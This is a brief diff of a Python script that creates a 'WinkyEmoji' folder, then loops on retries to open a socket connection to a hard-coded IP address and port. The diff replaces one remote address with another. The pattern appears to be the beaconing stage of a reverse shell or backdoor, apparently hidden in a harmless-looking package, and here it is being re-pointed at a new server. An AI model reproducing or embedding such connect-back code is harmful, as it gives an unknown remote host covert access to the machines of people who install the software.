@@ -13,7 +13,7 @@ os.system('mkdir WinkyEmoji')
 for x in range(10):
 	try:
 		s=socket.socket(2,socket.SOCK_STREAM)
-		s.connect(('52.15.183.149',15004))
+		s.connect(('18.216.53.253',11994))
 		break
 	except:
 		time.sleep(5)
